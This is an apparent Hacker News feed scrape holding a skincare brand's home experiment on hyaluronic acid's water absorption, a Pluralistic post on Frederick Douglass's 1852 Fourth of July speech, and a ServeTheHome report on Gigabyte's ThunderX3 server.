July 4, 2020 | https://www.oumere.com/blogs/news/hyaluronic-acid-does-not-hold-1000-times-its-weight-in-water-not-even-close | <a href="https://web.archive.org/web/*/https://www.oumere.com/blogs/news/hyaluronic-acid-does-not-hold-1000-times-its-weight-in-water-not-even-close">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
    <p>By Wendy Ouriel</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>




<p>How do you know if someone is a vegan, a runner, or bought a house in Malibu in 1970 for $15Â&nbsp;and it's now worth $40 million? Because they'll tell you. You can also count that if a skin care company uses hyaluronic acid they will tell you thatÂ&nbsp;it holds 1000x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>Well IÂ&nbsp;put that ad nauseam claim to the test. And I found that hyaluronic acid does not hold 1000x its weight in water. It doesn't hold 500x its weight in water, it doesn't even hold 100x its weight in water. I found that hyaluronic acid only holds about 10-50x its weight in water.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp;Â&nbsp;</p>






<p>PerhapsÂ&nbsp;more egregious than the thoroughly false claim, is that there is not a clear-cut way to determine how much hyaluronic acid actually absorbs, which is why I could only give a range of 10-50x in my results. Hyaluronic acid forms a gel when saturated, but there is not a subjective way to determine when that "gel" is fully saturated, and thus you cannot weigh the fully saturated gel to determine how much water was absorbed. I expected that I could filter the fully saturated gel from the water that wasn't absorbed, weigh it, and determine how much water was absorbed by the hyaluronic acid. I was not able to do that because the gel varied in thickness, or just changed the thickness of the water to such a slight degree it wasn't measurable.Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>






<p>I used hyaluronic acid of varying sizes to determine if there was a variation in the absorbency based on theÂ&nbsp;mass of the molecule. Hyaluronic acid is measured in daltons. Daltons areÂ&nbsp;used to measure something very low in mass, on the atomic level. 1 dalton = 0.00000000000000000000000166054 grams.Â&nbsp; Â&nbsp; Â&nbsp;</p>

<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;</p>
<p>Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp; Â&nbsp;Â&nbsp;</p>








<p>There was also a high degree of variation between the absorbency for hyaluronic acid depending on the molecular weight. High molecular weight, low molecular weight, and super low molecular weight had a similar absorbencies, butÂ&nbsp;ultra low molecular weight was barely able toÂ&nbsp;hold onto any water at all.Â&nbsp;</p>

<h4>Materials used in this experiment:</h4>

<p>Hyaluronic acid high molecular weight (HMW): 1.0-1.5 million daltons</p>
<p>Hyaluronic acid low molecular weight (HLW): 0.8-1.0 million daltons</p>
<p>Hyaluronic acid super low molecular weight (HSLMW): &lt;50,000 daltons</p>
<p>Hyaluronic acid ultra low molecular weight (HULMW): &lt;6,000 daltons</p>

<p>Distilled water</p>

<h4>Experimental methods and results</h4>
<p>The first part of the experiment, I went right to the claim that hyaluronic acid absorbs 1000x its weight in water. I weighed out 1g of HA for all molecular weights (HMW, HLW, HSLMW, HULMW) and placed this in 1000g of distilled water.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0202_large.JPG?v=1585939704" alt="">Â&nbsp;<img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0201_large.JPG?v=1585939693" alt=""></p>
<h6>Pictured here is 1g of HA and 1000g of water (quarter shown for scale). As you can see it is a bold claim to state that such a small amount of HA can absorb that much water. Experimentally, this would mean that the HA would turn the water into a thick gel when added. This did not happen.</h6>
<p>Â&nbsp;</p>
<p>I then let the mixture sit for two days to allow for total absorption to occur.</p>
<p>After two days the mixture looked no different than regular water. There was no discernible change in thickness. I filtered out the mixture to determine if any gel had formed, indicating absorption and no gel was obtained.</p>
<p>This means that hyaluronic acid did not absorb 1000x its weight in water. It did not even come close enough to that figure to be measured.</p>
<p>I repeated the above protocol for 500x HA's weight in water, 250x its weight in water and 100x its weight in water. At 100x its weight in water, there was some thickening of the water for HMW, HLW and HSLMW, but not for HULMW. These findings indicate that HA was beginning to show saturation, but this is 10x less than the claims of 1000.Â&nbsp;</p>
<p>When HMW, HLW and HSLMW was put in 50x its weight in water, a semi-thick gel (hair-gel consistency) formed. However, this was not how HA is supposed to look when fully saturated, indicating it was not able to fully absorb 50x its weight in water. Therefore I had to add less water to the mixture to determine HA's saturation point. It is also important to note that the gel thinned after day 2 and someÂ&nbsp; water precipitated to the top, indicating that some of what HA absorbed was later lost.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0194_large.JPG?v=1585939657" alt=""></p>
<h6>Gel pictured here formed at 50x weight in water, however the thinness of the gel indicated that HA was not able to fully absorb all of the water in its environment.Â&nbsp;</h6>
<p>The next step was to put HMW, HLW and HSLMW in 10x its weight in water. It was at this point that a fully saturated gel formed. This gel was dense, and had the properties of HA when fully saturated. It was only at this time that gel clumps were formed in the water, and could be decanted and weighed to determine how much HA was actually able to absorb.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/files/IMG_0199_large.JPG?v=1585939670" alt=""></p>
<h6>This gel, obtained by putting HA in 10x its weight in water had the thickness consistent with fully saturated hyaluronic acid.Â&nbsp;</h6>
<p>Â&nbsp;</p>
<p>This experiment told me that hyaluronic acid does not hold 1000x its weight in water, but it also told me something far more important. This experiment told me that there isn't sound scientific protocol for determining how much water hyaluronic acid is capable of absorbing. There was a varying degree in the thickness of the gels depending on how much water was added, and there wasn't a point in any of the experiments where I could subjectively and definitively determine where hyaluronic acid was fully saturated. A gel only started to form around the 50x its weight point, and the gel seemed to be fully saturated only around the 10x its weight point. The problem here is that it is fully up to the researcher to give a ballpark estimate based on their own perception to determine how much of hyaluronic acids weight it is actually able to absorb in water. That means that the science behind hyaluronic acid's absorption claims is somewhat dubious.Â&nbsp;</p>
<p>At the end of the day, it does not really matter how much water hyaluronic acid can absorb, from a skin care standpoint, because it is an ingredient that should be avoided due to its drying effect. It doesn't absorb into the skin and plump it, so who cares if it can absorb 10x its weight or 1000x its weight. Its all meaningless.</p>
<p>But what does matter is that a claim that has been parroted by every skin care company who uses it is completely false. And whats worse is thatÂ&nbsp;unsubstantiated hearsay is being passed off as scientific, and is repeated so often people take it at face value without any further research. None of these companies did their own research to back up the claim. They just repeated it and deceived everyone. Nothing about that is scientific.Â&nbsp;</p>
<p>It is about time that the real science stands up.</p>
<p><img src="https://cdn.shopify.com/s/files/1/0108/5243/3978/products/custom_resized_45ff905d-f9e6-4eaa-b0f8-f6e1e09f573e_large.jpg?v=1575030102" alt=""></p>
  </article></div>]]>
            </description>
            <link>https://www.oumere.com/blogs/news/hyaluronic-acid-does-not-hold-1000-times-its-weight-in-water-not-even-close</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734705</guid>
            <pubDate>Sat, 04 Jul 2020 20:27:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What to the Slave Is the 4th of July?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23734624">thread link</a>) | @samizdis
<br/>
July 4, 2020 | https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/#corinthian-hall | <a href="https://web.archive.org/web/*/https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/#corinthian-hall">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1061">
	<!-- .entry-header -->

	
	
	<div>
		<p><!-- Tags: frederick douglass,july 4,public domain,history,usausausa, Summary: What to the Slave Is the 4th of July URL: https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/ Title: Pluralistic: 04 Jul 2020 all-countries-matter Bullet: 👩🏿‍🎨 Separator: _,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_ Top Sources: Today's top sources: --><br>
<a href="https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/"><img src="https://i1.wp.com/craphound.com/images/04Jul2020.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/04Jul2020.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li><a href="https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/#corinthian-hall">What to the Slave Is the 4th of July</a>: Scan of the original 1852 pamphlet.</li>
<li><a href="https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/#retro">This day in history</a>: 2010, 2015, 2019</li>
<li><a href="https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/#bragsheet">Colophon</a>: Recent publications, upcoming appearances, current writing projects, current reading</li>
</ul>

<hr>
<p><a name="corinthian-hall"></a><br>
<img src="https://i1.wp.com/craphound.com/images/douglassspeech.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/douglassspeech.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>I'm not American. For the first half of my life, my touchstone for Jul 4 was the Schoolhouse Rock "Fireworks" segment that leaked over the border from Buffalo through Fox 29's UHF signal.</p>
<p><img src="https://i1.wp.com/craphound.com/images/schoolhousefireworksanimation.gif?w=840&amp;ssl=1" data-recalc-dims="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p><a href="https://www.youtube.com/watch?v=gdZYyY7g8g4">https://www.youtube.com/watch?v=gdZYyY7g8g4</a></p>
<p>When it came to how Americans had observed Jul 4 through history, my impressions came from whitewashed pop culture like Disney's Carousel of Progress:</p>
<p><img src="https://i0.wp.com/craphound.com/images/carousseljul4animation.gif?w=840&amp;ssl=1" data-recalc-dims="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p><a href="https://www.youtube.com/watch?v=Xo4jnlvJmrk">https://www.youtube.com/watch?v=Xo4jnlvJmrk</a></p>
<p>All that changed when I discovered Frederick Douglass's 1852 "What to the Slave Is the 4th of July?" – such a stirring piece of rhetoric that it practically leaps off the page.</p>
<p><a href="https://pluralistic.net/2020/07/03/monument-toppling-season/#all-countries-matter">https://pluralistic.net/2020/07/03/monument-toppling-season/#all-countries-matter</a></p>
<p>Today's Public Domain Review embeds the Internet Archive's gorgeous scan of the original 1852 pamphlet that was sold through Frederick Douglass' Paper (AKA The North Star) and to the attendees in Rochester's Corinthian Hall on that fateful night.</p>
<p><a href="https://publicdomainreview.org/collection/frederick-douglass-fourth-july-speech">https://publicdomainreview.org/collection/frederick-douglass-fourth-july-speech</a></p>
<p>Beyond that, the Review provides some much-needed context for the 19th Century Black experience of Jul 4, and the rival holiday, Jul 5, which commemorated the full abolishment of slavery in New York in 1827.</p>
<p>The speech's original title highlights the two holidays' divergence: "What, to the American slave, is your Fourth of July?" Jul 4 celebrations – and other public observances – were often accompanied by drunken white mobs attacking Black people and Black-owned businesses.</p>
<p>Black Americans celebrated Jul 5 with parades in New York, Boston, Philadelphia and elsewhere.</p>
<p>Douglass refused to give his speech on the 4th and instead gave it on the 5th, to a full house of 600 mostly white abolitionists, who bought 700+ copies of the pamphlet afterward.</p>
<p>Douglass labored over the speech for weeks and afterward wrote to an abolitionist to say that he thought it had gone over well. You can read the plain text of the speech here:</p>
<p><a href="https://rbscp.lib.rochester.edu/2945">https://rbscp.lib.rochester.edu/2945</a></p>
<hr>
<p><a name="retro"></a><br>
<img src="https://i0.wp.com/craphound.com/images/wayback-machine-hed-796x416.png?resize=796%2C416&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/wayback-machine-hed-796x416.png?resize=796%2C416&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>#10yrsago Econopocalypse: the Marxist animated whiteboard explanation <a href="http://blogs.reuters.com/felix-salmon/2010/07/02/communism-and-the-financial-crisis-cartoon-edition/">http://blogs.reuters.com/felix-salmon/2010/07/02/communism-and-the-financial-crisis-cartoon-edition/</a></p>
<p>#10yrsago Copyright scholars talk Copyright Termination <a href="http://ipcolloquium.com/mobile/">http://ipcolloquium.com/mobile/</a></p>
<p>#5yrsago Fantasy Sports: dungeon crawl ends in epic, eldritch basketball game https://boingboing.net/2015/07/04/fantasy-sports-dungeon-crawl.html</p>
<p>#5yrsago Hey, kids, let's play militarized police force! <a href="https://boingboing.net/2015/07/04/hey-kids-lets-play-militar.html">https://boingboing.net/2015/07/04/hey-kids-lets-play-militar.html</a></p>
<p>#5yrsago When Firms Become Persons and Persons Become Firms: outstanding lecture <a href="http://www.lse.ac.uk/lse-player?id=3154">http://www.lse.ac.uk/lse-player?id=3154</a></p>
<p>#1yrago Appeals court orders unsealing of the Jeffrey Epstein files <a href="https://www.courthousenews.com/court-orders-sunlight-on-huge-tranche-of-jeffrey-epstein-files/">https://www.courthousenews.com/court-orders-sunlight-on-huge-tranche-of-jeffrey-epstein-files/</a></p>
<hr>
<p><a name="bragsheet"></a><br>
<img src="https://i1.wp.com/craphound.com/images/colophonimages.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/colophonimages.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Today's top sources:</p>
<p>Currently writing:</p>
<ul>
<li>My next novel, "The Lost Cause," a post-GND novel about truth and reconciliation. Friday's progress: 535 words (34486 total).</li>
</ul>
<p>Currently reading: Anger Is a Gift by Mark Oshiro</p>
<p>Latest podcast: Someone Comes to Town, Someone Leaves Town (part 08) <a href="https://craphound.com/podcast/2020/06/29/someone-comes-to-town-someone-leaves-town-part-08/">https://craphound.com/podcast/2020/06/29/someone-comes-to-town-someone-leaves-town-part-08/</a></p>
<p>Upcoming appearances:</p>
<ul>
<li>In Conversation with Hank Green, Jul 10, <a href="https://www.magersandquinn.com/product_info?isbn_id=26578312&amp;products_id=163359157">https://www.magersandquinn.com/product_info?isbn_id=26578312&amp;products;_id=163359157</a></li>
</ul>
<p>Upcoming books: "Poesy the Monster Slayer" (Jul 2020), a picture book about monsters, bedtime, gender, and kicking ass. Pre-order here: <a href="https://us.macmillan.com/books/9781626723627">https://us.macmillan.com/books/9781626723627</a>. Get a personalized, signed copy here: <a href="https://www.darkdel.com/store/p1562/_Poesy_the_Monster_Slayer.html">https://www.darkdel.com/store/p1562/_Poesy_the_Monster_Slayer.html</a>.</p>
<p>"Attack Surface": The third Little Brother book, Oct 20, 2020. <a href="https://us.macmillan.com/books/9781250757531">https://us.macmillan.com/books/9781250757531</a></p>
<p>"Little Brother/Homeland": A reissue omnibus edition with a new introduction by Edward Snowden: <a href="https://us.macmillan.com/books/9781250774583">https://us.macmillan.com/books/9781250774583</a>; personalized/signed copies here: <a href="https://www.darkdel.com/store/p1750/July%3A__Little_Brother_%26_Homeland.html">https://www.darkdel.com/store/p1750/July%3A__Little_Brother_%26_Homeland.html</a></p>
<hr>
<p><img src="https://i1.wp.com/craphound.com/images/by.svg.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/by.svg.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>This work licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commerically, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net.</p>
<p><a href="https://creativecommons.org/licenses/by/4.0/">https://creativecommons.org/licenses/by/4.0/</a></p>
<p>Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution.</p>
<hr>

<p>Blog (no ads, tracking, or data-collection):</p>
<p><a href="http://pluralistic.net/">Pluralistic.net</a></p>
<p>Newsletter (no ads, tracking, or data-collection):</p>
<p><a href="https://pluralistic.net/plura-list">https://pluralistic.net/plura-list</a></p>
<p>Mastodon (no ads, tracking, or data-collection):</p>
<p><a href="https://mamot.fr/web/accounts/303320">https://mamot.fr/web/accounts/303320</a></p>
<p>Twitter (mass-scale, unrestricted, third-party surveillance and advertising):</p>
<p><a href="https://twitter.com/doctorow">https://twitter.com/doctorow</a></p>
<p>Tumblr (mass-scale, unrestricted, third-party surveillance and advertising):</p>
<p><a href="https://mostlysignssomeportents.tumblr.com/tagged/pluralistic">https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</a></p>
<p><em>When life gives you SARS, you make sarsaparilla</em> -Joey "Accordion Guy" DeVilla</p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://pluralistic.net/2020/07/04/pluralistic-04-jul-2020/#corinthian-hall</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734624</guid>
            <pubDate>Sat, 04 Jul 2020 20:13:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gigabyte Shows Marvell ThunderX3 R282 2U Server]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734547">thread link</a>) | @tinco
<br/>
July 4, 2020 | https://www.servethehome.com/gigabyte-shows-marvell-thunderx3-r282-2u-server/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/gigabyte-shows-marvell-thunderx3-r282-2u-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Cover.jpg" data-caption="Gigabyte R282 ThunderX3 Cover"><img width="696" height="449" src="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Cover-696x449.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Cover-696x449.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Cover-400x258.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Cover-651x420.jpg 651w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Cover.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Gigabyte R282 ThunderX3 Cover" title="Gigabyte R282 ThunderX3 Cover"></a><figcaption>Gigabyte R282 ThunderX3 Cover</figcaption></figure></div>
            <!-- content --><p>With Computex 2020 canceled, companies are trying to come up with ways to get their message out. At the Gigabyte Virtual Show 2020, the company has a few interesting products in their showcase and we wanted to highlight two of them. First, Gigabyte has the first (that we have seen) announced Marvell ThunderX3 server.<span id="more-44952"></span></p>
<h2>Gigabyte Marvell ThunderX3 Server</h2>
<p>Marvell ThunderX3 is the company’s next-gen server CPU. You may have seen Patrick, our editor-in-chief, speak at the&nbsp;<a href="https://www.servethehome.com/cavium-thunderx2-review-benchmarks-real-arm-server-option/">Cavium ThunderX2</a> launch that went live with our review. We also were early to the Arm server space with one of the first reviews of the original <a href="https://www.servethehome.com/cavium-thunderx-micro-benchmarks-enterprise-arm-developers-need-machines/">Cavium ThunderX</a>. A few month ago, we had an update on the <a href="https://www.servethehome.com/marvell-thunderx3-arm-server-cpu-with-768-threads-in-2020/">Marvell ThunderX3</a> without specifics. It seems that Gigabyte is showing off its next-gen ThunderX3 server already.</p>
<p><iframe title="The Evolution of ThunderX ARM servers" width="696" height="392" src="https://www.youtube.com/embed/kRZd-2pS-jc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Here are the key specs that Marvell has disclosed:</p>
<figure id="attachment_41839" aria-describedby="caption-attachment-41839"><a href="https://www.servethehome.com/marvell-thunderx3-arm-server-cpu-with-768-threads-in-2020/marvell-thunderx3-feature-summary/" rel="attachment wp-att-41839"><img src="https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary.jpg" alt="Marvell ThunderX3 Feature Summary" width="2183" height="1113" srcset="https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary.jpg 2183w, https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary-800x408.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary-1536x783.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary-2048x1044.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary-696x355.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary-1068x545.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/03/Marvell-ThunderX3-Feature-Summary-824x420.jpg 824w" sizes="(max-width: 2183px) 100vw, 2183px"></a><figcaption id="caption-attachment-41839">Marvell ThunderX3 Feature Summary</figcaption></figure>
<p>From the video, we can see that the new Gigabyte R282 servers (2U) have a proprietary motherboard with LGA4564 which means we can expect a dramatically larger pin footprint to accompany more I/O.</p>
<figure id="attachment_44955" aria-describedby="caption-attachment-44955"><a href="https://www.servethehome.com/?attachment_id=44955" rel="attachment wp-att-44955"><img src="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview.jpg" alt="Gigabyte R282 ThunderX3 Series Overview" width="2045" height="1152" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview.jpg 2045w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-800x451.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-1536x865.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-1068x602.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Overview-746x420.jpg 746w" sizes="(max-width: 2045px) 100vw, 2045px"></a><figcaption id="caption-attachment-44955">Gigabyte R282 ThunderX3 Series Overview</figcaption></figure>
<p>The&nbsp;Gigabyte R282 platform is using a proprietary motherboard. Our sense is that it is designed for not just this 2U form factor but also 1U-4U servers as well depending on the add-in card configuration. Gigabyte is also showing off NVIDIA V100 support. This is a big push by NVIDIA and Arm as we saw in <a href="https://www.servethehome.com/nvidia-cuda-on-arm-becoming-a-reality/">NVIDIA CUDA on Arm Becoming a Reality</a>.</p>
<figure id="attachment_44954" aria-describedby="caption-attachment-44954"><a href="https://www.servethehome.com/?attachment_id=44954" rel="attachment wp-att-44954"><img src="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear.jpg" alt="Gigabyte R282 ThunderX3 Series Rear" width="1975" height="1056" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear.jpg 1975w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-400x214.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-800x428.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-1536x821.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-696x372.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-1068x571.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/Gigabyte-R282-ThunderX3-Series-Rear-786x420.jpg 786w" sizes="(max-width: 1975px) 100vw, 1975px"></a><figcaption id="caption-attachment-44954">Gigabyte R282 ThunderX3 Series Rear</figcaption></figure>
<p>Since we have tested Gigabyte servers in both the ThunderX and ThunderX2 generations, we hope to get to check out the ThunderX3 variants soon. Gigabyte currently has other R282 servers such as those that are <a href="https://www.servethehome.com/amd-epyc-7002-series-rome-delivers-a-knockout/">AMD EPYC 7002 “Rome”</a> based, and we saw an Ampere-based server that looked like it was based on a similar platform. As a result, it seems as though Gigabyte is trying to use a common chassis or similar chassis with different architectures to build a larger product line. This is the ThunderX3 offering in that line.</p>
<h2>Final Words</h2>
<p>With this solution, Gigabyte and Marvell are targeting HPC and cloud computing industries. There are other Arm server vendors such as&nbsp;<a href="https://www.servethehome.com/ampere-altra-max-targets-a-128-core-arm-cpu-shipping-in-2021/">Ampere</a> focused on cloud-first Arm chips. Gigabyte is very open exploring new server architectures which is why it has a robust AMD EPYC line as well as a line of Ampere Altra servers we saw <a href="https://www.servethehome.com/ampere-altra-q80-30-in-action-at-ampere-hq/">in Action at Ampere HQ</a> pre-lockdown.</p>
